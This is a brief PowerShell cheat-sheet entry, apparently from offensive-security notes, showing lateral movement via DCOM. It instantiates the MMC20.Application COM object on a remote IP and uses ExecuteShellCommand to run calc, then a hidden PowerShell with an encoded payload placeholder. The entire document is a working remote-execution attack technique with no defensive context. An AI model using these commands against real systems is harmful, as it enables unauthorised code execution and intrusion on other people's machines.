# DCOM
#powershell 
```
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","[ip]"))

$dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc","7")


# DCOM
$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e [encoded payload]","7")
```